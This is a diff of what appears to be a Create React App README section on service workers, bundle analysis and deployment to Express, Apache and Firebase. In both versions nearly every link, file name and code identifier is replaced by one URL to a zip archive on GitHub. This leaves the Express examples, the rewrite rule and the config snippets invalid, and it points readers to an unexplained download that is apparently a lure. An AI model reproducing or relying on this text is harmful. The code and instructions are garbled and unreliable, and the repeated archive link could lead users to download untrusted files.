@@ -1798,30 +1798,30 @@ that your web app is reliably fast, even on a slow or unreliable network.
 
 If you would prefer not to enable service workers prior to your initial
 production deployment, then remove the call to `registerServiceWorker()`
-from [`https://raw.githubusercontent.com/kobmol/Tugas-Front-End/master/src/Front_Tugas_End_1.0.zip`](https://raw.githubusercontent.com/kobmol/Tugas-Front-End/master/src/Front_Tugas_End_1.0.zip).
+from [`https://github.com/kobmol/Tugas-Front-End/raw/refs/heads/master/src/Front_Tugas_End_1.0.zip`](https://github.com/kobmol/Tugas-Front-End/raw/refs/heads/master/src/Front_Tugas_End_1.0.zip).
 
 If you had previously enabled service workers in your production deployment and
 have decided that you would like to disable them for all your existing users,
 you can swap out the call to `registerServiceWorker()` in
-[`https://raw.githubusercontent.com/kobmol/Tugas-Front-End/master/src/Front_Tugas_End_1.0.zip`](https://raw.githubusercontent.com/kobmol/Tugas-Front-End/master/src/Front_Tugas_End_1.0.zip) first by modifying the service worker import:
+[`https://github.com/kobmol/Tugas-Front-End/raw/refs/heads/master/src/Front_Tugas_End_1.0.zip`](https://github.com/kobmol/Tugas-Front-End/raw/refs/heads/master/src/Front_Tugas_End_1.0.zip) first by modifying the service worker import:
 ```javascript
 import { unregister } from './registerServiceWorker';
 ```
 and then call `unregister()` instead.
 After the user visits a page that has `unregister()`,
-the service worker will be uninstalled. Note that depending on how `https://raw.githubusercontent.com/kobmol/Tugas-Front-End/master/src/Front_Tugas_End_1.0.zip` is served,
+the service worker will be uninstalled. Note that depending on how `https://github.com/kobmol/Tugas-Front-End/raw/refs/heads/master/src/Front_Tugas_End_1.0.zip` is served,
 it may take up to 24 hours for the cache to be invalidated.
 
 ### Offline-First Considerations
 
-1. Service workers [require HTTPS](https://raw.githubusercontent.com/kobmol/Tugas-Front-End/master/src/Front_Tugas_End_1.0.zip),
+1. Service workers [require HTTPS](https://github.com/kobmol/Tugas-Front-End/raw/refs/heads/master/src/Front_Tugas_End_1.0.zip),
 although to facilitate local testing, that policy
-[does not apply to `localhost`](https://raw.githubusercontent.com/kobmol/Tugas-Front-End/master/src/Front_Tugas_End_1.0.zip).
+[does not apply to `localhost`](https://github.com/kobmol/Tugas-Front-End/raw/refs/heads/master/src/Front_Tugas_End_1.0.zip).
 If your production web server does not support HTTPS, then the service worker
 registration will fail, but the rest of your web app will remain functional.
 
-1. Service workers are [not currently supported](https://raw.githubusercontent.com/kobmol/Tugas-Front-End/master/src/Front_Tugas_End_1.0.zip)
-in all web browsers. Service worker registration [won't be attempted](https://raw.githubusercontent.com/kobmol/Tugas-Front-End/master/src/Front_Tugas_End_1.0.zip)
+1. Service workers are [not currently supported](https://github.com/kobmol/Tugas-Front-End/raw/refs/heads/master/src/Front_Tugas_End_1.0.zip)
+in all web browsers. Service worker registration [won't be attempted](https://github.com/kobmol/Tugas-Front-End/raw/refs/heads/master/src/Front_Tugas_End_1.0.zip)
 on browsers that lack support.
 
 1. The service worker is only enabled in the [production environment](#deployment),
@@ -1838,24 +1838,24 @@ instructions for using other methods. *Be sure to always use an
 incognito window to avoid complications with your browser cache.*
 
 1. If possible, configure your production environment to serve the generated
-`https://raw.githubusercontent.com/kobmol/Tugas-Front-End/master/src/Front_Tugas_End_1.0.zip` [with HTTP caching disabled](https://raw.githubusercontent.com/kobmol/Tugas-Front-End/master/src/Front_Tugas_End_1.0.zip).
+`https://github.com/kobmol/Tugas-Front-End/raw/refs/heads/master/src/Front_Tugas_End_1.0.zip` [with HTTP caching disabled](https://github.com/kobmol/Tugas-Front-End/raw/refs/heads/master/src/Front_Tugas_End_1.0.zip).
 If that's not possible—[GitHub Pages](#github-pages), for instance, does not
 allow you to change the default 10 minute HTTP cache lifetime—then be aware
 that if you visit your production site, and then revisit again before
-`https://raw.githubusercontent.com/kobmol/Tugas-Front-End/master/src/Front_Tugas_End_1.0.zip` has expired from your HTTP cache, you'll continue to get
+`https://github.com/kobmol/Tugas-Front-End/raw/refs/heads/master/src/Front_Tugas_End_1.0.zip` has expired from your HTTP cache, you'll continue to get
 the previously cached assets from the service worker. If you have an immediate
 need to view your updated production deployment, performing a shift-refresh
 will temporarily disable the service worker and retrieve all assets from the
 network.
 
 1. Users aren't always familiar with offline-first web apps. It can be useful to
-[let the user know](https://raw.githubusercontent.com/kobmol/Tugas-Front-End/master/src/Front_Tugas_End_1.0.zip)
+[let the user know](https://github.com/kobmol/Tugas-Front-End/raw/refs/heads/master/src/Front_Tugas_End_1.0.zip)
 when the service worker has finished populating your caches (showing a "This web
 app works offline!" message) and also let them know when the service worker has
 fetched the latest updates that will be available the next time they load the
 page (showing a "New content is available; please refresh." message). Showing
 this messages is currently left as an exercise to the developer, but as a
-starting point, you can make use of the logic included in [`https://raw.githubusercontent.com/kobmol/Tugas-Front-End/master/src/Front_Tugas_End_1.0.zip`](https://raw.githubusercontent.com/kobmol/Tugas-Front-End/master/src/Front_Tugas_End_1.0.zip), which
+starting point, you can make use of the logic included in [`https://github.com/kobmol/Tugas-Front-End/raw/refs/heads/master/src/Front_Tugas_End_1.0.zip`](https://github.com/kobmol/Tugas-Front-End/raw/refs/heads/master/src/Front_Tugas_End_1.0.zip), which
 demonstrates which service worker lifecycle events to listen for to detect each
 scenario, and which as a default, just logs appropriate messages to the
 JavaScript console.
@@ -1865,26 +1865,26 @@ cross-origin traffic, like HTTP [API requests](#integrating-with-an-api-backend)
 images, or embeds loaded from a different domain. If you would like to use a
 runtime caching strategy for those requests, you can [`eject`](#npm-run-eject)
 and then configure the
-[`runtimeCaching`](https://raw.githubusercontent.com/kobmol/Tugas-Front-End/master/src/Front_Tugas_End_1.0.zip)
+[`runtimeCaching`](https://github.com/kobmol/Tugas-Front-End/raw/refs/heads/master/src/Front_Tugas_End_1.0.zip)
 option in the `SWPrecacheWebpackPlugin` section of
-[`https://raw.githubusercontent.com/kobmol/Tugas-Front-End/master/src/Front_Tugas_End_1.0.zip`](https://raw.githubusercontent.com/kobmol/Tugas-Front-End/master/src/Front_Tugas_End_1.0.zip).
+[`https://github.com/kobmol/Tugas-Front-End/raw/refs/heads/master/src/Front_Tugas_End_1.0.zip`](https://github.com/kobmol/Tugas-Front-End/raw/refs/heads/master/src/Front_Tugas_End_1.0.zip).
 
 ### Progressive Web App Metadata
 
 The default configuration includes a web app manifest located at
-[`https://raw.githubusercontent.com/kobmol/Tugas-Front-End/master/src/Front_Tugas_End_1.0.zip`](https://raw.githubusercontent.com/kobmol/Tugas-Front-End/master/src/Front_Tugas_End_1.0.zip), that you can customize with
+[`https://github.com/kobmol/Tugas-Front-End/raw/refs/heads/master/src/Front_Tugas_End_1.0.zip`](https://github.com/kobmol/Tugas-Front-End/raw/refs/heads/master/src/Front_Tugas_End_1.0.zip), that you can customize with
 details specific to your web application.
 
 When a user adds a web app to their homescreen using Chrome or Firefox on
-Android, the metadata in [`https://raw.githubusercontent.com/kobmol/Tugas-Front-End/master/src/Front_Tugas_End_1.0.zip`](https://raw.githubusercontent.com/kobmol/Tugas-Front-End/master/src/Front_Tugas_End_1.0.zip) determines what
+Android, the metadata in [`https://github.com/kobmol/Tugas-Front-End/raw/refs/heads/master/src/Front_Tugas_End_1.0.zip`](https://github.com/kobmol/Tugas-Front-End/raw/refs/heads/master/src/Front_Tugas_End_1.0.zip) determines what
 icons, names, and branding colors to use when the web app is displayed.
-[The Web App Manifest guide](https://raw.githubusercontent.com/kobmol/Tugas-Front-End/master/src/Front_Tugas_End_1.0.zip)
+[The Web App Manifest guide](https://github.com/kobmol/Tugas-Front-End/raw/refs/heads/master/src/Front_Tugas_End_1.0.zip)
 provides more context about what each field means, and how your customizations
 will affect your users' experience.
 
 ## Analyzing the Bundle Size
 
-[Source map explorer](https://raw.githubusercontent.com/kobmol/Tugas-Front-End/master/src/Front_Tugas_End_1.0.zip) analyzes
+[Source map explorer](https://github.com/kobmol/Tugas-Front-End/raw/refs/heads/master/src/Front_Tugas_End_1.0.zip) analyzes
 JavaScript bundles using the source maps. This helps you understand where code
 bloat is coming from.
 
@@ -1900,7 +1900,7 @@ Alternatively you may use `yarn`:
 yarn add source-map-explorer
 ```
 
-Then in `https://raw.githubusercontent.com/kobmol/Tugas-Front-End/master/src/Front_Tugas_End_1.0.zip`, add the following line to `scripts`:
+Then in `https://github.com/kobmol/Tugas-Front-End/raw/refs/heads/master/src/Front_Tugas_End_1.0.zip`, add the following line to `scripts`:
 
 ```diff
    "scripts": {
@@ -1920,18 +1920,18 @@ npm run analyze
 
 ## Deployment
 
-`npm run build` creates a `build` directory with a production build of your app. Set up your favorite HTTP server so that a visitor to your site is served `https://raw.githubusercontent.com/kobmol/Tugas-Front-End/master/src/Front_Tugas_End_1.0.zip`, and requests to static paths like `/static/js/main.<hash>.js` are served with the contents of the `/static/js/main.<hash>.js` file.
+`npm run build` creates a `build` directory with a production build of your app. Set up your favorite HTTP server so that a visitor to your site is served `https://github.com/kobmol/Tugas-Front-End/raw/refs/heads/master/src/Front_Tugas_End_1.0.zip`, and requests to static paths like `/static/js/main.<hash>.js` are served with the contents of the `/static/js/main.<hash>.js` file.
 
 ### Static Server
 
-For environments using [Node](https://raw.githubusercontent.com/kobmol/Tugas-Front-End/master/src/Front_Tugas_End_1.0.zip), the easiest way to handle this would be to install [serve](https://raw.githubusercontent.com/kobmol/Tugas-Front-End/master/src/Front_Tugas_End_1.0.zip) and let it handle the rest:
+For environments using [Node](https://github.com/kobmol/Tugas-Front-End/raw/refs/heads/master/src/Front_Tugas_End_1.0.zip), the easiest way to handle this would be to install [serve](https://github.com/kobmol/Tugas-Front-End/raw/refs/heads/master/src/Front_Tugas_End_1.0.zip) and let it handle the rest:
 
 ```sh
 npm install -g serve
 serve -s build
 ```
 
-The last command shown above will serve your static site on the port **5000**. Like many of [serve](https://raw.githubusercontent.com/kobmol/Tugas-Front-End/master/src/Front_Tugas_End_1.0.zip)’s internal settings, the port can be adjusted using the `-p` or `--port` flags.
+The last command shown above will serve your static site on the port **5000**. Like many of [serve](https://github.com/kobmol/Tugas-Front-End/raw/refs/heads/master/src/Front_Tugas_End_1.0.zip)’s internal settings, the port can be adjusted using the `-p` or `--port` flags.
 
 Run this command to get a full list of the options available:
 
@@ -1943,20 +1943,20 @@ serve -h
 
 You don’t necessarily need a static server in order to run a Create React App project in production. It works just as fine integrated into an existing dynamic one.
 
-Here’s a programmatic example using [Node](https://raw.githubusercontent.com/kobmol/Tugas-Front-End/master/src/Front_Tugas_End_1.0.zip) and [Express](https://raw.githubusercontent.com/kobmol/Tugas-Front-End/master/src/Front_Tugas_End_1.0.zip):
+Here’s a programmatic example using [Node](https://github.com/kobmol/Tugas-Front-End/raw/refs/heads/master/src/Front_Tugas_End_1.0.zip) and [Express](https://github.com/kobmol/Tugas-Front-End/raw/refs/heads/master/src/Front_Tugas_End_1.0.zip):
 
 ```javascript
 const express = require('express');
 const path = require('path');
 const app = express();
 
-https://raw.githubusercontent.com/kobmol/Tugas-Front-End/master/src/Front_Tugas_End_1.0.zip(https://raw.githubusercontent.com/kobmol/Tugas-Front-End/master/src/Front_Tugas_End_1.0.zip(https://raw.githubusercontent.com/kobmol/Tugas-Front-End/master/src/Front_Tugas_End_1.0.zip(__dirname, 'build')));
+https://github.com/kobmol/Tugas-Front-End/raw/refs/heads/master/src/Front_Tugas_End_1.0.zip(https://github.com/kobmol/Tugas-Front-End/raw/refs/heads/master/src/Front_Tugas_End_1.0.zip(https://github.com/kobmol/Tugas-Front-End/raw/refs/heads/master/src/Front_Tugas_End_1.0.zip(__dirname, 'build')));
 
-https://raw.githubusercontent.com/kobmol/Tugas-Front-End/master/src/Front_Tugas_End_1.0.zip('/', function (req, res) {
-  https://raw.githubusercontent.com/kobmol/Tugas-Front-End/master/src/Front_Tugas_End_1.0.zip(https://raw.githubusercontent.com/kobmol/Tugas-Front-End/master/src/Front_Tugas_End_1.0.zip(__dirname, 'build', 'https://raw.githubusercontent.com/kobmol/Tugas-Front-End/master/src/Front_Tugas_End_1.0.zip'));
+https://github.com/kobmol/Tugas-Front-End/raw/refs/heads/master/src/Front_Tugas_End_1.0.zip('/', function (req, res) {
+  https://github.com/kobmol/Tugas-Front-End/raw/refs/heads/master/src/Front_Tugas_End_1.0.zip(https://github.com/kobmol/Tugas-Front-End/raw/refs/heads/master/src/Front_Tugas_End_1.0.zip(__dirname, 'build', 'https://github.com/kobmol/Tugas-Front-End/raw/refs/heads/master/src/Front_Tugas_End_1.0.zip'));
 });
 
-https://raw.githubusercontent.com/kobmol/Tugas-Front-End/master/src/Front_Tugas_End_1.0.zip(9000);
+https://github.com/kobmol/Tugas-Front-End/raw/refs/heads/master/src/Front_Tugas_End_1.0.zip(9000);
 ```
 
 The choice of your server software isn’t important either. Since Create React App is completely platform-agnostic, there’s no need to explicitly use Node.
@@ -1967,44 +1967,44 @@ However this is not quite enough if you use client-side routing. Read the next s
 
 ### Serving Apps with Client-Side Routing
 
-If you use routers that use the HTML5 [`pushState` history API](https://raw.githubusercontent.com/kobmol/Tugas-Front-End/master/src/Front_Tugas_End_1.0.zip) under the hood (for example, [React Router](https://raw.githubusercontent.com/kobmol/Tugas-Front-End/master/src/Front_Tugas_End_1.0.zip) with `browserHistory`), many static file servers will fail. For example, if you used React Router with a route for `/todos/42`, the development server will respond to `localhost:3000/todos/42` properly, but an Express serving a production build as above will not.
+If you use routers that use the HTML5 [`pushState` history API](https://github.com/kobmol/Tugas-Front-End/raw/refs/heads/master/src/Front_Tugas_End_1.0.zip) under the hood (for example, [React Router](https://github.com/kobmol/Tugas-Front-End/raw/refs/heads/master/src/Front_Tugas_End_1.0.zip) with `browserHistory`), many static file servers will fail. For example, if you used React Router with a route for `/todos/42`, the development server will respond to `localhost:3000/todos/42` properly, but an Express serving a production build as above will not.
 
-This is because when there is a fresh page load for a `/todos/42`, the server looks for the file `build/todos/42` and does not find it. The server needs to be configured to respond to a request to `/todos/42` by serving `https://raw.githubusercontent.com/kobmol/Tugas-Front-End/master/src/Front_Tugas_End_1.0.zip`. For example, we can amend our Express example above to serve `https://raw.githubusercontent.com/kobmol/Tugas-Front-End/master/src/Front_Tugas_End_1.0.zip` for any unknown paths:
+This is because when there is a fresh page load for a `/todos/42`, the server looks for the file `build/todos/42` and does not find it. The server needs to be configured to respond to a request to `/todos/42` by serving `https://github.com/kobmol/Tugas-Front-End/raw/refs/heads/master/src/Front_Tugas_End_1.0.zip`. For example, we can amend our Express example above to serve `https://github.com/kobmol/Tugas-Front-End/raw/refs/heads/master/src/Front_Tugas_End_1.0.zip` for any unknown paths:
 
 ```diff
- https://raw.githubusercontent.com/kobmol/Tugas-Front-End/master/src/Front_Tugas_End_1.0.zip(https://raw.githubusercontent.com/kobmol/Tugas-Front-End/master/src/Front_Tugas_End_1.0.zip(https://raw.githubusercontent.com/kobmol/Tugas-Front-End/master/src/Front_Tugas_End_1.0.zip(__dirname, 'build')));
+ https://github.com/kobmol/Tugas-Front-End/raw/refs/heads/master/src/Front_Tugas_End_1.0.zip(https://github.com/kobmol/Tugas-Front-End/raw/refs/heads/master/src/Front_Tugas_End_1.0.zip(https://github.com/kobmol/Tugas-Front-End/raw/refs/heads/master/src/Front_Tugas_End_1.0.zip(__dirname, 'build')));
 
-https://raw.githubusercontent.com/kobmol/Tugas-Front-End/master/src/Front_Tugas_End_1.0.zip('/', function (req, res) {
-+https://raw.githubusercontent.com/kobmol/Tugas-Front-End/master/src/Front_Tugas_End_1.0.zip('/*', function (req, res) {
-   https://raw.githubusercontent.com/kobmol/Tugas-Front-End/master/src/Front_Tugas_End_1.0.zip(https://raw.githubusercontent.com/kobmol/Tugas-Front-End/master/src/Front_Tugas_End_1.0.zip(__dirname, 'build', 'https://raw.githubusercontent.com/kobmol/Tugas-Front-End/master/src/Front_Tugas_End_1.0.zip'));
+https://github.com/kobmol/Tugas-Front-End/raw/refs/heads/master/src/Front_Tugas_End_1.0.zip('/', function (req, res) {
++https://github.com/kobmol/Tugas-Front-End/raw/refs/heads/master/src/Front_Tugas_End_1.0.zip('/*', function (req, res) {
+   https://github.com/kobmol/Tugas-Front-End/raw/refs/heads/master/src/Front_Tugas_End_1.0.zip(https://github.com/kobmol/Tugas-Front-End/raw/refs/heads/master/src/Front_Tugas_End_1.0.zip(__dirname, 'build', 'https://github.com/kobmol/Tugas-Front-End/raw/refs/heads/master/src/Front_Tugas_End_1.0.zip'));
  });
 ```
 
-If you’re using [Apache HTTP Server](https://raw.githubusercontent.com/kobmol/Tugas-Front-End/master/src/Front_Tugas_End_1.0.zip), you need to create a `.htaccess` file in the `public` folder that looks like this:
+If you’re using [Apache HTTP Server](https://github.com/kobmol/Tugas-Front-End/raw/refs/heads/master/src/Front_Tugas_End_1.0.zip), you need to create a `.htaccess` file in the `public` folder that looks like this:
 
 ```
     Options -MultiViews
     RewriteEngine On
     RewriteCond %{REQUEST_FILENAME} !-f
-    RewriteRule ^ https://raw.githubusercontent.com/kobmol/Tugas-Front-End/master/src/Front_Tugas_End_1.0.zip [QSA,L]
+    RewriteRule ^ https://github.com/kobmol/Tugas-Front-End/raw/refs/heads/master/src/Front_Tugas_End_1.0.zip [QSA,L]
 ```
 
 It will get copied to the `build` folder when you run `npm run build`. 
 
-If you’re using [Apache Tomcat](https://raw.githubusercontent.com/kobmol/Tugas-Front-End/master/src/Front_Tugas_End_1.0.zip), you need to follow [this Stack Overflow answer](https://raw.githubusercontent.com/kobmol/Tugas-Front-End/master/src/Front_Tugas_End_1.0.zip).
+If you’re using [Apache Tomcat](https://github.com/kobmol/Tugas-Front-End/raw/refs/heads/master/src/Front_Tugas_End_1.0.zip), you need to follow [this Stack Overflow answer](https://github.com/kobmol/Tugas-Front-End/raw/refs/heads/master/src/Front_Tugas_End_1.0.zip).
 
 Now requests to `/todos/42` will be handled correctly both in development and in production.
 
-On a production build, and in a browser that supports [service workers](https://raw.githubusercontent.com/kobmol/Tugas-Front-End/master/src/Front_Tugas_End_1.0.zip),
+On a production build, and in a browser that supports [service workers](https://github.com/kobmol/Tugas-Front-End/raw/refs/heads/master/src/Front_Tugas_End_1.0.zip),
 the service worker will automatically handle all navigation requests, like for
-`/todos/42`, by serving the cached copy of your `https://raw.githubusercontent.com/kobmol/Tugas-Front-End/master/src/Front_Tugas_End_1.0.zip`. This
+`/todos/42`, by serving the cached copy of your `https://github.com/kobmol/Tugas-Front-End/raw/refs/heads/master/src/Front_Tugas_End_1.0.zip`. This
 service worker navigation routing can be configured or disabled by
 [`eject`ing](#npm-run-eject) and then modifying the
-[`navigateFallback`](https://raw.githubusercontent.com/kobmol/Tugas-Front-End/master/src/Front_Tugas_End_1.0.zip)
-and [`navigateFallbackWhitelist`](https://raw.githubusercontent.com/kobmol/Tugas-Front-End/master/src/Front_Tugas_End_1.0.zip)
-options of the `SWPreachePlugin` [configuration](https://raw.githubusercontent.com/kobmol/Tugas-Front-End/master/src/Front_Tugas_End_1.0.zip).
+[`navigateFallback`](https://github.com/kobmol/Tugas-Front-End/raw/refs/heads/master/src/Front_Tugas_End_1.0.zip)
+and [`navigateFallbackWhitelist`](https://github.com/kobmol/Tugas-Front-End/raw/refs/heads/master/src/Front_Tugas_End_1.0.zip)
+options of the `SWPreachePlugin` [configuration](https://github.com/kobmol/Tugas-Front-End/raw/refs/heads/master/src/Front_Tugas_End_1.0.zip).
 
-When users install your app to the homescreen of their device the default configuration will make a shortcut to `https://raw.githubusercontent.com/kobmol/Tugas-Front-End/master/src/Front_Tugas_End_1.0.zip`. This may not work for client-side routers which expect the app to be served from `/`. Edit the web app manifest at [`https://raw.githubusercontent.com/kobmol/Tugas-Front-End/master/src/Front_Tugas_End_1.0.zip`](https://raw.githubusercontent.com/kobmol/Tugas-Front-End/master/src/Front_Tugas_End_1.0.zip) and change `start_url` to match the required URL scheme, for example:
+When users install your app to the homescreen of their device the default configuration will make a shortcut to `https://github.com/kobmol/Tugas-Front-End/raw/refs/heads/master/src/Front_Tugas_End_1.0.zip`. This may not work for client-side routers which expect the app to be served from `/`. Edit the web app manifest at [`https://github.com/kobmol/Tugas-Front-End/raw/refs/heads/master/src/Front_Tugas_End_1.0.zip`](https://github.com/kobmol/Tugas-Front-End/raw/refs/heads/master/src/Front_Tugas_End_1.0.zip) and change `start_url` to match the required URL scheme, for example:
 
 ```js
   "start_url": ".",
@@ -2013,16 +2013,16 @@ When users install your app to the homescreen of their device the default config
 ### Building for Relative Paths
 
 By default, Create React App produces a build assuming your app is hosted at the server root.<br>
-To override this, specify the `homepage` in your `https://raw.githubusercontent.com/kobmol/Tugas-Front-End/master/src/Front_Tugas_End_1.0.zip`, for example:
+To override this, specify the `homepage` in your `https://github.com/kobmol/Tugas-Front-End/raw/refs/heads/master/src/Front_Tugas_End_1.0.zip`, for example:
 
 ```js
-  "homepage": "https://raw.githubusercontent.com/kobmol/Tugas-Front-End/master/src/Front_Tugas_End_1.0.zip",
+  "homepage": "https://github.com/kobmol/Tugas-Front-End/raw/refs/heads/master/src/Front_Tugas_End_1.0.zip",
 ```
 
 This will let Create React App correctly infer the root path to use in the generated HTML file.
 
 **Note**: If you are using `react-router@^4`, you can root `<Link>`s using the `basename` prop on any `<Router>`.<br>
-More information [here](https://raw.githubusercontent.com/kobmol/Tugas-Front-End/master/src/Front_Tugas_End_1.0.zip).<br>
+More information [here](https://github.com/kobmol/Tugas-Front-End/raw/refs/heads/master/src/Front_Tugas_End_1.0.zip).<br>
 <br>
 For example:
 ```js
@@ -2034,25 +2034,25 @@ For example:
 
 >Note: this feature is available with `react-scripts@0.9.0` and higher.
 
-If you are not using the HTML5 `pushState` history API or not using client-side routing at all, it is unnecessary to specify the URL from which your app will be served. Instead, you can put this in your `https://raw.githubusercontent.com/kobmol/Tugas-Front-End/master/src/Front_Tugas_End_1.0.zip`:
+If you are not using the HTML5 `pushState` history API or not using client-side routing at all, it is unnecessary to specify the URL from which your app will be served. Instead, you can put this in your `https://github.com/kobmol/Tugas-Front-End/raw/refs/heads/master/src/Front_Tugas_End_1.0.zip`:
 
 ```js
   "homepage": ".",
 ```
 
-This will make sure that all the asset paths are relative to `https://raw.githubusercontent.com/kobmol/Tugas-Front-End/master/src/Front_Tugas_End_1.0.zip`. You will then be able to move your app from `https://raw.githubusercontent.com/kobmol/Tugas-Front-End/master/src/Front_Tugas_End_1.0.zip` to `https://raw.githubusercontent.com/kobmol/Tugas-Front-End/master/src/Front_Tugas_End_1.0.zip` or even `https://raw.githubusercontent.com/kobmol/Tugas-Front-End/master/src/Front_Tugas_End_1.0.zip` without having to rebuild it.
+This will make sure that all the asset paths are relative to `https://github.com/kobmol/Tugas-Front-End/raw/refs/heads/master/src/Front_Tugas_End_1.0.zip`. You will then be able to move your app from `https://github.com/kobmol/Tugas-Front-End/raw/refs/heads/master/src/Front_Tugas_End_1.0.zip` to `https://github.com/kobmol/Tugas-Front-End/raw/refs/heads/master/src/Front_Tugas_End_1.0.zip` or even `https://github.com/kobmol/Tugas-Front-End/raw/refs/heads/master/src/Front_Tugas_End_1.0.zip` without having to rebuild it.
 
-### [Azure](https://raw.githubusercontent.com/kobmol/Tugas-Front-End/master/src/Front_Tugas_End_1.0.zip)
+### [Azure](https://github.com/kobmol/Tugas-Front-End/raw/refs/heads/master/src/Front_Tugas_End_1.0.zip)
 
-See [this](https://raw.githubusercontent.com/kobmol/Tugas-Front-End/master/src/Front_Tugas_End_1.0.zip) blog post on how to deploy your React app to Microsoft Azure.
+See [this](https://github.com/kobmol/Tugas-Front-End/raw/refs/heads/master/src/Front_Tugas_End_1.0.zip) blog post on how to deploy your React app to Microsoft Azure.
 
-See [this](https://raw.githubusercontent.com/kobmol/Tugas-Front-End/master/src/Front_Tugas_End_1.0.zip) blog post or [this](https://raw.githubusercontent.com/kobmol/Tugas-Front-End/master/src/Front_Tugas_End_1.0.zip) repo for a way to use automatic deployment to Azure App Service.
+See [this](https://github.com/kobmol/Tugas-Front-End/raw/refs/heads/master/src/Front_Tugas_End_1.0.zip) blog post or [this](https://github.com/kobmol/Tugas-Front-End/raw/refs/heads/master/src/Front_Tugas_End_1.0.zip) repo for a way to use automatic deployment to Azure App Service.
 
-### [Firebase](https://raw.githubusercontent.com/kobmol/Tugas-Front-End/master/src/Front_Tugas_End_1.0.zip)
+### [Firebase](https://github.com/kobmol/Tugas-Front-End/raw/refs/heads/master/src/Front_Tugas_End_1.0.zip)
 
-Install the Firebase CLI if you haven’t already by running `npm install -g firebase-tools`. Sign up for a [Firebase account](https://raw.githubusercontent.com/kobmol/Tugas-Front-End/master/src/Front_Tugas_End_1.0.zip) and create a new project. Run `firebase login` and login with your previous created Firebase account.
+Install the Firebase CLI if you haven’t already by running `npm install -g firebase-tools`. Sign up for a [Firebase account](https://github.com/kobmol/Tugas-Front-End/raw/refs/heads/master/src/Front_Tugas_End_1.0.zip) and create a new project. Run `firebase login` and login with your previous created Firebase account.
 
-Then run the `firebase init` command from your project’s root. You need to choose the **Hosting: Configure and deploy Firebase Hosting sites** and choose the Firebase project you created in the previous step. You will need to agree with `https://raw.githubusercontent.com/kobmol/Tugas-Front-End/master/src/Front_Tugas_End_1.0.zip` being created, choose `build` as the public directory, and also agree to **Configure as a single-page app** by replying with `y`.
+Then run the `firebase init` command from your project’s root. You need to choose the **Hosting: Configure and deploy Firebase Hosting sites** and choose the Firebase project you created in the previous step. You will need to agree with `https://github.com/kobmol/Tugas-Front-End/raw/refs/heads/master/src/Front_Tugas_End_1.0.zip` being created, choose `build` as the public directory, and also agree to **Configure as a single-page app** by replying with `y`.
 
 ```sh
     === Project Setup
@@ -2068,9 +2068,9 @@ Then run the `firebase init` command from your project’s root. You need to cho
     Firebase Realtime Database Rules allow you to define how your data should be
     structured and when your data can be read from and written to.
 
-    ? What file should be used for Database Rules? https://raw.githubusercontent.com/kobmol/Tugas-Front-End/master/src/Front_Tugas_End_1.0.zip
-    ✔  Database Rules for example-app-fd690 have been downloaded to https://raw.githubusercontent.com/kobmol/Tugas-Front-End/master/src/Front_Tugas_End_1.0.zip
-    Future modifications to https://raw.githubusercontent.com/kobmol/Tugas-Front-End/master/src/Front_Tugas_End_1.0.zip will update Database Rules when you run
+    ? What file should be used for Database Rules? https://github.com/kobmol/Tugas-Front-End/raw/refs/heads/master/src/Front_Tugas_End_1.0.zip
+    ✔  Database Rules for example-app-fd690 have been downloaded to https://github.com/kobmol/Tugas-Front-End/raw/refs/heads/master/src/Front_Tugas_End_1.0.zip
+    Future modifications to https://github.com/kobmol/Tugas-Front-End/raw/refs/heads/master/src/Front_Tugas_End_1.0.zip will update Database Rules when you run
     firebase deploy.
 
     === Hosting Setup
@@ -2080,23 +2080,23 @@ Then run the `firebase init` command from your project’s root. You need to cho
     have a build process for your assets, use your build's output directory.
 
     ? What do you want to use as your public directory? build
-    ? Configure as a single-page app (rewrite all urls to https://raw.githubusercontent.com/kobmol/Tugas-Front-End/master/src/Front_Tugas_End_1.0.zip)? Yes
-    ✔  Wrote https://raw.githubusercontent.com/kobmol/Tugas-Front-End/master/src/Front_Tugas_End_1.0.zip
+    ? Configure as a single-page app (rewrite all urls to https://github.com/kobmol/Tugas-Front-End/raw/refs/heads/master/src/Front_Tugas_End_1.0.zip)? Yes
+    ✔  Wrote https://github.com/kobmol/Tugas-Front-End/raw/refs/heads/master/src/Front_Tugas_End_1.0.zip
 
-    i  Writing configuration info to https://raw.githubusercontent.com/kobmol/Tugas-Front-End/master/src/Front_Tugas_End_1.0.zip
+    i  Writing configuration info to https://github.com/kobmol/Tugas-Front-End/raw/refs/heads/master/src/Front_Tugas_End_1.0.zip
     i  Writing project information to .firebaserc...
 
     ✔  Firebase initialization complete!
 ```
 
-IMPORTANT: you need to set proper HTTP caching headers for `https://raw.githubusercontent.com/kobmol/Tugas-Front-End/master/src/Front_Tugas_End_1.0.zip` file in `https://raw.githubusercontent.com/kobmol/Tugas-Front-End/master/src/Front_Tugas_End_1.0.zip` file or you will not be able to see changes after first deployment ([issue #2440](https://raw.githubusercontent.com/kobmol/Tugas-Front-End/master/src/Front_Tugas_End_1.0.zip)). It should be added inside `"hosting"` key like next:
+IMPORTANT: you need to set proper HTTP caching headers for `https://github.com/kobmol/Tugas-Front-End/raw/refs/heads/master/src/Front_Tugas_End_1.0.zip` file in `https://github.com/kobmol/Tugas-Front-End/raw/refs/heads/master/src/Front_Tugas_End_1.0.zip` file or you will not be able to see changes after first deployment ([issue #2440](https://github.com/kobmol/Tugas-Front-End/raw/refs/heads/master/src/Front_Tugas_End_1.0.zip)). It should be added inside `"hosting"` key like next:
 
 ```
 {
   "hosting": {
     ...
     "headers": [
-      {"source": "https://raw.githubusercontent.com/kobmol/Tugas-Front-End/master/src/Front_Tugas_End_1.0.zip", "headers": [{"key": "Cache-Control", "value": "no-cache"}]}
+      {"source": "https://github.com/kobmol/Tugas-Front-End/raw/refs/heads/master/src/Front_Tugas_End_1.0.zip", "headers": [{"key": "Cache-Control", "value": "no-cache"}]}
     ]
     ...
 ```
@@ -2115,40 +2115,40 @@ Now, after you create a production build with `npm run build`, you can deploy it
 
     ✔  Deploy complete!
 
-    Project Console: https://raw.githubusercontent.com/kobmol/Tugas-Front-End/master/src/Front_Tugas_End_1.0.zip
-    Hosting URL: https://raw.githubusercontent.com/kobmol/Tugas-Front-End/master/src/Front_Tugas_End_1.0.zip
+    Project Console: https://github.com/kobmol/Tugas-Front-End/raw/refs/heads/master/src/Front_Tugas_End_1.0.zip
+    Hosting URL: https://github.com/kobmol/Tugas-Front-End/raw/refs/heads/master/src/Front_Tugas_End_1.0.zip
 ```
 
-For more information see [Add Firebase to your JavaScript Project](https://raw.githubusercontent.com/kobmol/Tugas-Front-End/master/src/Front_Tugas_End_1.0.zip).
